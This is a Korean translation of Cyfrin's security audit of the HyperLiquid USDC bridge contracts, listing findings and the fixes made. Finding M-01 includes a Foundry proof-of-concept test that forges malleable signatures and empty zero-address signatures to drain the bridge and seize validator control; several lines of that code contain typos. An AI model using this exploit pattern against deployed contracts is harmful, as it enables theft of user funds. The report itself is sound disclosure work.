---
title: Cyfrin Hyperliquid 감사 보고서
author: Cyfrin.io
date: 2023년 4월 11일
linkcolor: blue
urlcolor: blue
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.pdf}
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries HyperLiquid 감사 보고서\par}
    \vspace{1cm}
    {\Large 버전 2.1\par}
    \vspace{2cm}
    {\Large\itshape Cyfrin.io\par}
    \vfill
    {\large 2023년 4월 11일\par}
\end{titlepage}

\maketitle

<!-- 보고서 시작! -->

작성자: [Cyfrin](https://cyfrin.io)

수석 감사자:

- [Giovanni Di Siena](https://twitter.com/giovannidisiena)

- [Hans](https://twitter.com/hansfriese)

# 목차
- [목차](#table-of-contents)
- [면책 조항](#disclaimer)
- [프로토콜 개요](#protocol-summary)
- [감사 세부 정보](#audit-details)
  - [범위](#scope)
  - [중요도 기준](#severity-criteria)
  - [발견 사항 요약](#summary-of-findings)
- [중간 중요도 발견 사항 (Medium Findings)](#medium-findings)
  - [\[M-01\] `updateValidatorSet`에서 잘못된 서명 검증, 가변성(malleability) 및 0 주소 보호 부족](#m-01-bad-signature-validation-malleability--lack-of-zero-address-protection-in-updatevalidatorset)
    - [설명](#description)
    - [개념 증명 (Proof of Concept)](#proof-of-concept)
    - [파급력](#impact)
    - [권장 완화 조치](#recommended-mitigation)
    - [`f045dbf` 해결 사항](#f045dbf-resolution)
  - [\[M-02\] `powerThreshold`의 잘못된 초기화 및 검증 부족](#m-02-incorrect-initialization-of-powerthreshold-and-lack-of-validation)
    - [설명](#description-1)
    - [파급력](#impact-1)
    - [권장 완화 조치](#recommended-mitigation-1)
    - [`f045dbf` 해결 사항](#f045dbf-resolution-1)
- [낮은 중요도 발견 사항 (Low Findings)](#low-findings)
  - [\[L-01\] 임의의 큰 값으로 새로운 에포크(epoch) 설정을 방지](#l-01-prevent-setting-the-new-epoch-to-an-arbitrary-large-value)
    - [설명](#description-2)
    - [파급력](#impact-2)
    - [권장 완화 조치](#recommended-mitigation-2)
    - [`f045dbf` 해결 사항](#f045dbf-resolution-2)
- [정보성/비치명적 발견 사항 (Informational/Non-Critical Findings)](#informationalnon-critical-findings)
  - [\[NC-01\] `minTotalValidatorPower`를 불변(immutable)으로 설정](#nc-01-make-mintotalvalidatorpower-immutable)
    - [`f045dbf` 해결 사항](#f045dbf-resolution-3)
  - [\[NC-02\] 꼭 필요한 경우가 아니라면 이니셜라이저 사용 피하기](#nc-02-avoid-using-an-initializer-unless-absolutely-necessary)
    - [`f045dbf` 해결 사항](#f045dbf-resolution-4)
  - [\[NC-03\] 수정되지 않는 모든 함수 인수에 calldata 사용](#nc-03-use-calldata-for-all-function-arguments-that-are-not-modified)
    - [`f045dbf` 해결 사항](#f045dbf-resolution-5)
  - [\[NC-04\] `updateValidatorSet` 블록 범위가 필요하지 않음](#nc-04-updatevalidatorset-block-scope-is-not-necessary)
    - [`f045dbf` 해결 사항](#f045dbf-resolution-6)
  - [\[NC-05\] 상호작용 전에 이벤트 발생](#nc-05-emit-events-before-interaction)
    - [`f045dbf` 해결 사항](#f045dbf-resolution-7)
  - [\[NC-06\] USDC 수량 명명법을 더 명확하게 변경](#nc-06-make-usdc-amount-naming-more-verbose)
    - [`f045dbf` 해결 사항](#f045dbf-resolution-8)
  - [\[NC-07\] 계약 이름과 일치하도록 파일 이름을 `Bridge2.sol`로 변경](#nc-07-rename-file-to-bridge2sol-to-match-the-contract-name)
    - [`f045dbf` 해결 사항](#f045dbf-resolution-9)
  - [\[NC-08\] 함수 매개변수 및 동작을 문서화하기 위한 누락된 NatSpec 주석 추가](#nc-08-add-missing-natspec-comments-to-document-function-parameters-and-behaviour)
    - [`f045dbf` 해결 사항](#f045dbf-resolution-10)
  - [\[NC-09\] 변수를 0으로 명시적으로 초기화할 필요 없음](#nc-09-no-need-to-explicitly-initialize-variables-to-0)
    - [`f045dbf` 해결 사항](#f045dbf-resolution-11)
  - [\[NC-10\] 덧셈 할당 연산자 사용](#nc-10-use-addition-assignment-operator)
    - [`f045dbf` 해결 사항](#f045dbf-resolution-12)
  - [\[NC-11\] 로컬호스트 체인 ID는 1337 또는 31337일 수 있음](#nc-11-localhost-chain-id-can-be-1337-or-31337)
    - [`f045dbf` 해결 사항](#f045dbf-resolution-13)
  - [\[NC-12\] DOMAIN\_SEPARATOR로 이름을 변경하고 `block.chainId`를 직접 사용](#nc-12-rename-to-domain_separator-and-use-blockchainid-directly)
    - [`f045dbf` 해결 사항](#f045dbf-resolution-14)
  - [\[NC-13\] `EIP712_DOMAIN_TYPEHASH`로 이름 변경](#nc-13-rename-to-eip712_domain_typehash)
    - [`f045dbf` 해결 사항](#f045dbf-resolution-15)
  - [\[NC-14\] 도메인 타입해시에 `byte32 salt` 포함](#nc-14-include-byte32-salt-in-domain-typehash)
    - [`f045dbf` 해결 사항](#f045dbf-resolution-16)
  - [\[NC-15\] 검증(Verifying) 계약 TODO](#nc-15-verifying-contract-todo)
    - [`f045dbf` 해결 사항](#f045dbf-resolution-17)

# 면책 조항

Cyfrin 팀은 주어진 시간 내에 코드에서 가능한 많은 취약점을 찾기 위해 모든 노력을 기울이지만, 본 문서의 발견 사항에 대해 어떠한 책임도 지지 않습니다. 팀의 보안 감사는 기본 비즈니스 또는 제품을 보증하지 않습니다. 감사는 1주일로 제한되었으며, 코드 검토는 전적으로 계약의 Solidity 구현 보안 측면에만 중점을 두었습니다.

# 프로토콜 개요
HyperLiquid 브리지 계약은 Arbitrum에서 실행되며, 텐더민트(Tendermint) 합의를 실행하는 HyperLiquid L1과 함께 작동합니다. 검증자(Validator) 세트 업데이트는 각 에포크(epoch)가 끝날 때 발생하며, 그 기간은 아직 미정이지만 1일에서 1주일 사이가 될 것으로 보입니다. 현재 계약은 USDC만 지원하지만, 로직은 Arbitrum의 다른 ERC20 토큰에 대한 입출금을 지원하도록 확장될 수 있습니다.

# 감사 세부 정보

## 범위

2023년 3월 16일부터 2023년 3월 20일까지 Cyfrin 팀은 HyperLiquid `Bridge.sol` 및 `Signature.sol` 계약에 대한 감사를 수행했습니다.

커밋 해시: [hyperliquid-dex/contracts](https://github.com/hyperliquid-dex/contracts)의 `e0aff46`.

범위 제외:
tests 디렉토리의 테스트 파일 `example.rs`.

## 중요도 기준

- 상 (High): 자산이 직접적으로 도난/분실/손상될 수 있는 경우 (또는 터무니없는 가정이 없는 유효한 공격 경로가 있는 경우 간접적으로).

- 중 (Medium): 자산이 즉각적인 위험에 처하지는 않지만, 프로토콜의 기능이나 가용성에 영향을 미칠 수 있거나, 명시된 가정하에 가상의 공격 경로를 통해 가치가 유출될 수 있지만 외부 요구 사항이 있는 경우.

- 하 (Low): 낮은 파급력과 낮음/중간 가능성의 사건으로 자산이 위험에 처하지 않음 (또는 사소한 양의 자산만 해당), 상태 처리가 다소 벗어남, 함수가 natspec과 관련하여 올바르지 않음, 주석 문제 등.

- 정보성 / 비치명적 (Informational / Non-Critical): 보안 문제가 아닌 제안된 코드 개선, 주석, 변수 이름 변경 등. 감사자는 이러한 목록을 빠짐없이 찾으려고 시도하지 않았습니다.

- 가스 (Gas): 가스 절약 / 성능 제안. 감사자는 이러한 목록을 빠짐없이 찾으려고 시도하지 않았습니다.

## 발견 사항 요약

| 발견 사항                                                                                        | 중요도 | 상태   |
| :--------------------------------------------------------------------------------------------- | :------- | :------- |
| [\[M-01\] `updateValidatorSet`에서 잘못된 서명 검증, 가변성(malleability) 및 0 주소 보호 부족](#m-01-bad-signature-validation-malleability--lack-of-zero-address-protection-in-updatevalidatorset)      | M | 해결됨 |
| [\[M-02\] `powerThreshold`의 잘못된 초기화 및 검증 부족](#m-02-incorrect-initialization-of-powerthreshold-and-lack-of-validation)                                                                | M | 해결됨 |
| [\[L-01\] 임의의 큰 값으로 새로운 에포크(epoch) 설정을 방지](#l-01-prevent-setting-the-new-epoch-to-an-arbitrary-large-value)                                                                                    | L | 확인됨(Ack)      |
| [\[NC-01\] `minTotalValidatorPower`를 불변(immutable)으로 설정](#nc-01-make-mintotalvalidatorpower-immutable)                                                                                                                      | I | 해결됨 |
| [\[NC-02\] 꼭 필요한 경우가 아니라면 이니셜라이저 사용 피하기](#nc-02-avoid-using-an-initializer-unless-absolutely-necessary)                                                                                        | I | 해결됨 |
| [\[NC-03\] 수정되지 않는 모든 함수 인수에 calldata 사용](#nc-03-use-calldata-for-all-function-arguments-that-are-not-modified)                                                                          | I | 확인됨(Ack)      |
| [\[NC-04\] `updateValidatorSet` 블록 범위가 필요하지 않음](#nc-04-updatevalidatorset-block-scope-is-not-necessary)                                                                                                  | I | 해결됨 |
| [\[NC-05\] 상호작용 전에 이벤트 발생](#nc-05-emit-events-before-interaction)                                                                                                                                        | I | 해결됨 |
| [\[NC-06\] USDC 수량 명명법을 더 명확하게 변경](#nc-06-make-usdc-amount-naming-more-verbose)                                                                                                                            | I | 확인됨(Ack)      |
| [\[NC-07\] 계약 이름과 일치하도록 파일 이름을 `Bridge2.sol`로 변경](#nc-07-rename-file-to-bridge2sol-to-match-the-contract-name)                                                                                      | I | 해결됨 |
| [\[NC-08\] 함수 매개변수 및 동작을 문서화하기 위한 누락된 NatSpec 주석 추가](#nc-08-add-missing-natspec-comments-to-document-function-parameters-and-behaviour)                                                | I | 확인됨(Ack)      |
| [\[NC-09\] 변수를 0으로 명시적으로 초기화할 필요 없음](#nc-09-no-need-to-explicitly-initialize-variables-to-0)                                                                                                      | I | 해결됨 |
| [\[NC-10\] 덧셈 할당 연산자 사용](#nc-10-use-addition-assignment-operator)                                                                                                                                    | I | 해결됨 |
| [\[NC-11\] 로컬호스트 체인 ID는 1337 또는 31337일 수 있음](#nc-11-localhost-chain-id-can-be-1337-or-31337)                                                                                                                      | I | 해결됨 |
| [\[NC-12\] DOMAIN\_SEPARATOR로 이름을 변경하고 `block.chainId`를 직접 사용](#nc-12-rename-to-domain_separator-and-use-blockchainid-directly)                                                                              | I | 해결됨 |
| [\[NC-13\] `EIP712_DOMAIN_TYPEHASH`로 이름 변경](#nc-13-rename-to-eip712_domain_typehash)                                                                                                                                | I | 해결됨 |
| [\[NC-14\] 도메인 타입해시에 `byte32 salt` 포함](#nc-14-include-byte32-salt-in-domain-typehash)                                                                                                                    | I | 확인됨(Ack)      |
| [\[NC-15\] 검증(Verifying) 계약 TODO](#nc-15-verifying-contract-todo)                                                                                                                                                      | I | 확인됨(Ack)      |

# 중간 중요도 발견 사항 (Medium Findings)

## [M-01] `updateValidatorSet`에서 잘못된 서명 검증, 가변성(malleability) 및 0 주소 보호 부족

### 설명

`ecrecover` 내장은 메시지 다이제스트와 해당 서명에서 서명자를 복구하지 못하면 `address(0)`을 반환합니다. [`Signature::recoverSigner`](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Signature.sol#L62) 또는 [`Bridge::checkValidatorSignatures`](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L154)에는 `address(0)` 확인이 없습니다.

검증자 세트가 초기화되었거나 임계값 권한(threshold power)을 가진 0 주소 검증자 세트로 업데이트된 경우, 누구나 `Bridge::withdraw`를 호출하여 브리지 자금을 훔치거나 `Bridge::updateValidatorSet`을 호출하여 단독 검증자로서 브리지를 장악하기 위해 잘못된 서명을 제출할 수 있습니다. 물론 이는 검증자의 최선의 이익이 아니기 때문에 가능성은 매우 낮지만, 잘못된 서명자 복구가 문제가 되는 한 여전히 가능하며 완화되어야 합니다.

또한 가단성(malleable) 있는 검증자 서명을 사용하여 `Bridge::withdraw` 및 `Bridge::updateValidatorSet`을 호출하는 것이 가능합니다. 타원 곡선의 특성으로 인해 서명을 수정하여 동일한 서명자 주소로 복구되는 또 다른 고유한 서명을 생성할 수 있습니다. 다행히 `Bridge::processedWithdrawals` 매핑과 검증자(에포크) 체크포인트는 재생(replay)을 방지합니다. 잘못된 서명자 복구와 함께 이는 [OpenZeppelin ECDSA 라이브러리](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol)를 사용하여 완화되어야 합니다.

### 개념 증명 (Proof of Concept)

다음 forge 테스트는 이러한 발견 사항을 보여줍니다:

```solidity
function test_signatureMalleabilityAndBadValidation() public {
    address sender = makeAddr("alice");
    address pwner = makeAddr("pwner");
    uint256 amount = 1e5;
    uint256 nonce = 0;
    ValidatorSet memory validatorSet = ValidatorSet(0, s_validators,s_powers);
    Signature[] memory sigs = _getSignatures(sender, amount, nonce);
    Signature[] memory sigsCache = sigs;
    for (uint256 i = 0; i < sigs.length; ++i) {
        sigs[i].s =
            uint256(115792089237316195423570985008687907852837564279074904382605163141518161494337) - sigs[i].s;
        sigs[i].v = sigs[i].v == 27 ? 28 : 27;
    }
    console.log("withdrawing with malleable signatures");
    vm.startPrank(sender);
    bridge.withdraw(amount, nonce, validatorSet, validatorSet.validators,sigs);
    console.log(
        "fortunately, the `processedWithdrawals` mapping and validator(epoch) checkpoints protect against replay"
    );
    vm.expectRevert("Already withdrawn");
    bridge.withdraw(amount, nonce, validatorSet, validatorSet.validators,sigsCache);
    ValidatorSet memory newValidatorSet = ValidatorSet(1, s_newValidators,s_newPowers);
    vm.expectEmit(true, false, false, true);
    emit ValidatorSetUpdatedEvent(newValidatorSet.epoch, newValidatorSetvalidators, newValidatorSet.powers);
    Signature[] memory updateValidatorSigs = _getUpdateValidatorSignature(newValidatorSet, s_validatorKeys);
    bridge.updateValidatorSet(newValidatorSet, validatorSet, validatorSetvalidators, updateValidatorSigs);
    for (uint256 i = 0; i < updateValidatorSigs.length; ++i) {
        updateValidatorSigs[i].s = uint256(
            115792089237316195423570985008687907852837564279074904382605163141518161494337
        ) - updateValidatorSigs[i].s;
        updateValidatorSigs[i].v = updateValidatorSigs[i].v == 27 ? 28 : 27;
    }
    ValidatorSet memory emptyValidatorSet = ValidatorSet(2, s_zeroValidators,s_newPowers);
    bridge.updateValidatorSet(
        emptyValidatorSet, newValidatorSet, newValidatorSet.validators,_getUpdateValidatorSignatures(emptyValidatorSet, s_newValidatorKeys)
    );
    vm.expectRevert("New validator set epoch must be greater than the currentepoch");
    bridge.updateValidatorSet(newValidatorSet, emptyValidatorSet,emptyValidatorSet.validators, updateValidatorSigs);
    console.log("but what if validator set is updated to zero addressvalidator set with non-zero power?");
    address[] memory validatorArr = new address[](1);
    validatorArr[0] = PWNER;
    uint256[] memory powerArr = new uint256[](1);
    powerArr[0] = uint256(1000000);
    ValidatorSet memory pwnValidatorSet = ValidatorSet(3, validatorArr,powerArr);
    Signature[] memory emptySigs = new Signature[](3);
    emptySigs[0] = Signature(0, 0, 0);
    emptySigs[1] = Signature(0, 0, 0);
    emptySigs[2] = Signature(0, 0, 0);
    console.log("anyone can submit bad signatures to steal bridge funds");
    changePrank(pwner);
    emit log_named_uint("bridge balance before", IERC20(USDC_ADDRESS)balanceOf(address(bridge)));
    emit log_named_uint("pwner balance before", IERC20(USDC_ADDRESS).balanceO(pwner));
    bridge.withdraw(IERC20(USDC_ADDRESS).balanceOf(address(bridge)), 0,emptyValidatorSet, emptyValidatorSet.validators, emptySigs);
    emit log_named_uint("pwner balance after", IERC20(USDC_ADDRESS).balanceO(pwner));
    emit log_named_uint("bridge balance after", IERC20(USDC_ADDRESS).balanceO(address(bridge)));
    vm.expectEmit(true, false, false, true);
    emit ValidatorSetUpdatedEvent(pwnValidatorSet.epoch, pwnValidatorSetvalidators, pwnValidatorSet.powers);
    bridge.updateValidatorSet(pwnValidatorSet, emptyValidatorSet,emptyValidatorSet.validators, emptySigs);
    console.log("or take over the bridge as a solitary validator");
}

function _getUpdateValidatorSignatures(ValidatorSet memory newValidatorSet, uint256[] memory currValidatorKeys)
    internal
    view
    returns (Signature[] memory)
{
    Signature[] memory signatures = new Signature[](s_validators.length);
    bytes32 newCheckpoint =
        keccak256(abi.encode(newValidatorSet.validators, newValidatorSetpowers, newValidatorSet.epoch));
    Agent memory agent = Agent("a", newCheckpoint);
    bytes32 digest = keccak256(abi.encodePacked("\x19\x01",LOCALHOST_DOMAIN_HASH, hash(agent)));
    for (uint256 i = 0; i < s_validators.length; ++i) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(currValidatorKeys[i],digest);
        signatures[i] = Signature(uint256(r), uint256(s), v);
    }
    return signatures;
}
function _getWithdrawSignatures(address sender, uint256 amount, uint256nonce) internal view returns (Signature[] memory) {
    Signature[] memory signatures = new Signature[](s_validators.length);
    Agent memory agent = Agent("a", keccak256(abi.encode(sender, amount,nonce)));
    bytes32 digest = keccak256(abi.encodePacked("\x19\x01",LOCALHOST_DOMAIN_HASH, hash(agent)));
    for (uint256 i = 0; i < s_validators.length; ++i) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(s_validatorKeys[i], digest);
        // console.log("validator: %s", i);
        // console.log("v: %s", uint256(v));
        // console.log("r: %s", uint256(r));
        // console.log("s: %s", uint256(s));
        signatures[i] = Signature(uint256(r), uint256(s), v);
    }
    return signatures;
}
```

### 파급력

설명된 취약점은 가능성은 낮지만 파급력이 높으므로 중요도를 **중(MEDIUM)**으로 평가합니다.

### 권장 완화 조치

위에서 언급한 바와 같이, [OpenZeppelin ECDSA 라이브러리](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol)를 사용하여 복구된 서명자를 올바르게 검증하고 서명 가변성으로부터 보호하는 것이 좋습니다. 또한 취약한 상태로 검증자 세트를 업데이트하는 것이 불가능하도록 `Bridge::updateValidatorSet`에 0 주소 검증을 추가하세요.

**수정 (2023-04-14):** OpenZeppelin `ECDSA`는 4.7.3 미만 버전에 취약점이 있어 공격자가 악용할 수 있습니다. 이 라이브러리를 사용할 때는 최신 버전의 @openzeppelin/contracts 또는 최소 4.7.3 이상의 버전을 사용하세요.

### `f045dbf` 해결 사항

이 발견 사항을 해결하기 위해 `Signature.sol::recoverSigner`에 0 주소 확인이 추가되었습니다. 클라이언트 팀은 이것이 L1과 브리지의 무결성이 이미 손상된 경우에만 발생하는 나쁜 서명 악용을 수행하기 위해 검증자의 2/3의 조정이 필요하기 때문에 실행 가능한 악용이라고 생각하지 않으며, 대신 낮음(Low)/NC 중요도 문제여야 한다고 말했습니다. Cyfrin 팀은 제한된 범위와 맥락을 고려할 때 이 감사 범위 내에서는 이것이 중간(Medium) 중요도라고 유지합니다.

## [M-02] `powerThreshold`의 잘못된 초기화 및 검증 부족

### 설명

`Bridge::powerThreshold`는 어느 시점에서든 현재 검증자들의 검증자 권한 합계의 2/3여야 합니다. 그러나 `Bridge2::constructor`에서의 [계산](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L94)이 올바르지 않으며, `(2 * _minTotalValidatorPower) / 3`로 초기화됩니다. 이는 `Bridge::updateValidatorSet`의 경우처럼 `checkNewValidatorPowers`의 반환 값을 사용하여 `powerThreshold = (2 * cumulativePower) / 3;`이어야 합니다.
`cumulativePower >= minTotalValidatorPower`라는 사실로부터 초기화된 `powerThreshold`가 합리적인 값보다 작다는 것을 의미합니다.
또한 클라이언트 팀과의 커뮤니케이션에서 `minTotalValidatorPower`는 반올림 문제를 방지하기 위해서만 사용되며 변경되지 않고(불변) 한 번만 설정된다는 것을 이해했습니다. 따라서 이 값은 실제 누적 권한 주변에 있을 가능성이 낮고 그것보다 훨씬 적을 가능성이 높습니다.
`powerThreshold`가 상당히 작은 값으로 초기화되기 때문에, 이는 검증 권한이 부족한 악의적인 행동을 허용할 수 있습니다.

또한 프로토콜은 `powerThreshold`를 검증 없이 임의의 값으로 설정할 수 있는 [관리자 기능](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L252-L256)을 구현합니다. 이는 권장되지 않으며 `powerThreshold`가 전체 검증자 권한 합계의 2/3 이상이고 전체 검증자 권한 합계를 초과하지 않아야 한다는 것과 동일한 검증을 받아야 합니다.

### 파급력

`powerThreshold`의 잘못된 초기화로 인해 검증 권한이 부족한 악의적인 행동이 허용될 수 있습니다.
이니셜라이저는 관리자에 의해 호출된다고 가정되고 `powerThreshold`를 변경하는 또 다른 관리자 기능도 있으므로 중요도를 **중(MEDIUM)**으로 평가합니다.

### 권장 완화 조치

- `powerThreshold`를 초기 검증자 권한 합계의 2/3로 초기화하세요.
- `Bridge::changePowerThreshold()`에서 합리적인 값(현재 누적 검증 권한의 2/3에서 전체 범위)만 허용하도록 새로운 `powerThreshold`에 대한 검증을 추가하세요.

### `f045dbf` 해결 사항

이제 계산은 생성자에서 `powerThreshold`를 설정하기 위해 `checkNewValidatorPowers`에서 반환된 `cumulativePower`를 사용합니다. 클라이언트 팀은 초기 검증자 세트가 팀이 되도록 의도되었고 향후 검증자 업데이트는 이 문제에 취약하지 않기 때문에 이것도 낮음(Low)/NC 중요도라고 말합니다. Cyfrin 팀은 제한된 범위와 맥락을 고려할 때 이 감사 범위 내에서는 이것이 중간(Medium) 중요도라고 유지합니다.

# 낮은 중요도 발견 사항 (Low Findings)

## [L-01] 임의의 큰 값으로 새로운 에포크(epoch) 설정을 방지

### 설명

`Bridge::updateValidatorSet` 함수에서 새 에포크는 현재 에포크보다 큰지 [확인됩니다](https://github.com/ChainAccelOrg/hyperliquid-audit/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L213). 그러나 새 에포크를 프로토콜을 동결하는 데 사용할 수 있는 임의의 큰 값으로 설정하는 것을 방지하는 검사는 없습니다. `type(uint256).max`로 설정되면 더 이상의 업데이트가 불가능합니다.

### 파급력

이런 일이 발생할 가능성은 낮지만 프로토콜을 동결하고 자금을 잠그며 사실상 전체 프로토콜을 지급 불능 상태로 만들 수 있기 때문에 **하(LOW)**로 평가합니다.

### 권장 완화 조치

임의의 큰 숫자가 아니라 어느 정도 제한된 범위 내에서만 에포크 증가를 허용하는 것이 좋습니다.

### `f045dbf` 해결 사항

클라이언트 팀은 다음 주석과 함께 이 발견 사항을 확인(Acknowledge)했습니다:

> 이것은 우리에게 유용한 변경 사항처럼 보이지 않습니다. 이것은 보안상의 이점 없이 L1 에포크 업데이트 로직을 제한합니다. 에포크를 `MAX_INT`로 악의적으로 설정하면 실제로 스마트 계약이 잠기겠지만, 이는 L1과 브리지가 이미 손상되었음을 의미합니다.

# 정보성/비치명적 발견 사항 (Informational/Non-Critical Findings)

## [NC-01] `minTotalValidatorPower`를 불변(immutable)으로 설정

`Bridge::minTotalValidatorPower`가 생성자에서 한 번 초기화되고 그 이후에는 절대 수정되지 않으므로 불변(immutable)으로 만들 수 있습니다. 이는 또한 스토리지에서 값을 읽는 함수의 가스 사용량을 줄이는 효과가 있습니다.

### `f045dbf` 해결 사항

`minTotalValidatorPower`가 이제 불변입니다.

## [NC-02] 꼭 필요한 경우가 아니라면 이니셜라이저 사용 피하기

[이 주석](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L85-L86)은 별도의 이니셜라이저 도입 가능성을 언급하지만, 나쁜 초기화는 야생(in the wild)에서 많은 악용의 원인이 되므로 가능한 한 피해야 한다는 점에 유의해야 합니다.

### `f045dbf` 해결 사항

주석이 제거되었습니다.

## [NC-03] 수정되지 않는 모든 함수 인수에 calldata 사용

함수 인수가 수정될 의도가 없다면 메모리 대신 calldata 인수로 전달하는 것이 모범 사례입니다. 예를 들어 [`Bridge::updateValidatorSet`](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#LL94C48-L94C48)에서입니다.

### `f045dbf` 해결 사항

클라이언트 팀은 다음 주석과 함께 이 발견 사항을 확인(Acknowledge)했습니다:

> 테스트를 통해 우리는 Arbitrum에서 메모리를 사용하는 것이 calldata보다 가스를 덜 필요로 하는 것 같다는 것을 알았고, 그래서 처음부터 모든 것을 메모리를 사용하여 작성했습니다.

## [NC-04] `updateValidatorSet` 블록 범위가 필요하지 않음

`Bridge::updateValidatorSet`의 블록 범위는 계약이 그것 없이도 성공적으로 컴파일되므로 필요하지 않으며 제거할 수 있습니다.

### `f045dbf` 해결 사항

블록 범위가 제거되었습니다.

## [NC-05] 상호작용 전에 이벤트 발생

체크-효과-상호작용(checks-effect-interactions)을 엄격하게 준수하기 위해, [외부 상호작용](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L122-L123) 전에 이벤트를 발생시키는 것이 좋습니다. 이는 상태 재구성을 통한 올바른 마이그레이션을 보장하기 위해 일반적으로 권장되며, 이 경우 `Bridge::deposit`이 `nonReentrant`로 표시되어 있어 영향을 받지 않지만 여전히 좋은 관행입니다.

### `f045dbf` 해결 사항

이제 외부 상호작용 전에 이벤트가 발생합니다.

## [NC-06] USDC 수량 명명법을 더 명확하게 변경

[`Bridge::deposit 및 Bridge::withdraw`](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L120-L152)의 USDC 수량 매개변수 명명법이 명확하지 않습니다. 즉, `uint256 usdc`를 `uin256 usdcAmount`로 변경하세요.

### `f045dbf` 해결 사항

클라이언트 팀은 다음 주석과 함께 이 발견 사항을 확인(Acknowledge)했습니다:

> 우리에게 유용한 변경 사항처럼 보이지 않습니다. `usdc`는 `uint256` 타입이므로 명확하며, 우리는 l1 코드와 solidity 이벤트 필드에서도 동일한 규칙을 사용합니다.

## [NC-07] 계약 이름과 일치하도록 파일 이름을 `Bridge2.sol`로 변경

`Bridge2` 계약은 `Bridge.sol`에 있지만, 동일한 이름의 파일당 하나의 계약이라는 규칙을 따르는 것이 모범 사례입니다.

### `f045dbf` 해결 사항

클라이언트 팀은 다음 주석과 함께 계약 이름을 `Bridge.sol`로 변경했습니다:

> 우리는 현재 브리지를 대체할 때까지 내부적으로 Bridge2라고 부르며, 그 시점에 모든 것을 Bridge로 이름을 바꿀 것입니다.

## [NC-08] 함수 매개변수 및 동작을 문서화하기 위한 누락된 NatSpec 주석 추가

모든 함수 동작과 매개변수, 특히 공개(public-facing)된 경우 문서화하는 것이 좋습니다.

### `f045dbf` 해결 사항

클라이언트 팀은 다음 주석과 함께 이 발견 사항을 확인(Acknowledge)했습니다:

> `Bridge.sol`의 함수들에 가벼운 주석이 추가되었습니다.

## [NC-09] 변수를 0으로 명시적으로 초기화할 필요 없음

Solidity에서 변수는 기본적으로 0으로 초기화되므로 [많은](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L169-L170) [불필요한](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L173) [할당](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L236-L237)을 제거할 수 있습니다.

### `f045dbf` 해결 사항

불필요한 할당이 제거되었습니다.

## [NC-10] 덧셈 할당 연산자 사용

[새로운 검증자 권한을 확인할 때](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L238) 덧셈 할당 연산자 `+=`를 사용할 수 있습니다.

### `f045dbf` 해결 사항

덧셈 할당 연산자가 사용되었습니다.

## [NC-11] 로컬호스트 체인 ID는 1337 또는 31337일 수 있음

일부 프레임워크(예: HardHat)의 기본 로컬호스트 체인 ID는 `1337`이 아니라 `31337`입니다. 예를 들어, `Signature::LOCALHOST_CHAIN_ID`를 `31337`로 변경하지 않으면 forge를 사용하여 서명 테스트를 실행할 수 없습니다.

### `f045dbf` 해결 사항

이것은 NC-12의 해결로 해결되었습니다.

## [NC-12] DOMAIN_SEPARATOR로 이름을 변경하고 `block.chainId`를 직접 사용

`Signature`의 `*_DOMAIN_HASH` 참조는 EIP와 더 일관성을 유지하고 혼란을 피하기 위해 `*_DOMAIN_SEPARATOR`로 이름을 변경해야 합니다. 또한 `block.chainId`를 직접 사용하여 계약 생성 시 캐싱하고 체인 ID가 변경되는 경우에만 도메인 구분자를 다시 계산하여 여러 다른 구분자를 정의할 필요를 없애는 것이 좋습니다.

### `f045dbf` 해결 사항

클라이언트 팀은 체인 ID가 변경될 경우 도메인 구분자를 다시 계산하는 것에 대한 Cyfrin 팀의 의견에 대응하여 다음 주석과 함께 도메인 구분자 상수를 제거하고 단일 `EIP712_DOMAIN_SEPARATOR` 상수를 사용했습니다:

> 하드 포크 우려는 생각할 가치가 없는 엣지 케이스일 수 있습니다.

## [NC-13] `EIP712_DOMAIN_TYPEHASH`로 이름 변경

가독성을 위해 [추가 밑줄](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Signature.sol#L19)을 추가하세요.

### `f045dbf` 해결 사항

상수 이름이 `EIP712_DOMAIN_TYPEHASH`로 변경되었습니다.

## [NC-14] 도메인 타입해시에 `byte32 salt` 포함

[EIP](https://eips.ethereum.org/EIPS/eip-712)에 따르면, 이 애플리케이션을 다른 애플리케이션과 구별하기 위한 최후의 수단으로 `bytes32 salt`를 [도메인 구분자](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Signature.sol#L20)에 추가해야 합니다. 브리지에서 재생될 수 있는 다른 계약에 대한 서명이 생성될 가능성은 낮지만, 솔트(salt)를 포함하면 적은 추가 오버헤드로 추가적인 보안 보증을 제공합니다.

### `f045dbf` 해결 사항

클라이언트 팀은 다음 주석과 함께 이 발견 사항을 확인(Acknowledge)했습니다:

